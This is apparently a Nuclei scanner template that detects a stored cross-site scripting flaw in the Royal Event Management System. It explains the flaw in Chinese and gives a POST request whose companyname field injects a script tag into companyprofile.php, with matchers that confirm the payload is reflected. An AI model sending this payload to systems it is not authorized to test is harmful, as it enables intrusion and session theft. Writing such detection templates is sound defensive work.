id: royalevent-stored-xss

info:
  name: Royal Event Management System - Stored - 跨站脚本漏洞
  author: ritikchaddha
  severity: high
  description: |
    该模板用于检测 Royal Event Management System - Stored - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/royal_event/companyprofile.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://packetstormsecurity.com/files/166479/Royale-Event-Management-System-1.0-Cross-Site-Scripting.html
    - https://www.sourcecodester.com/sites/default/files/download/oretnom23/Royal%20Event.zip
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 1
  tags: xss,unauth,cms,royalevent,packetstorm,vuln

http:
  - raw:
      - |
        POST /royal_event/companyprofile.php HTTP/1.1
        Host: {{Hostname}}

        companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&companyaddress=&companyemail=&country=India&mobilenumber=1234567899&submit=

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'value="><script>alert(document.domain)</script>" >'

      - type: status
        status:
          - 302
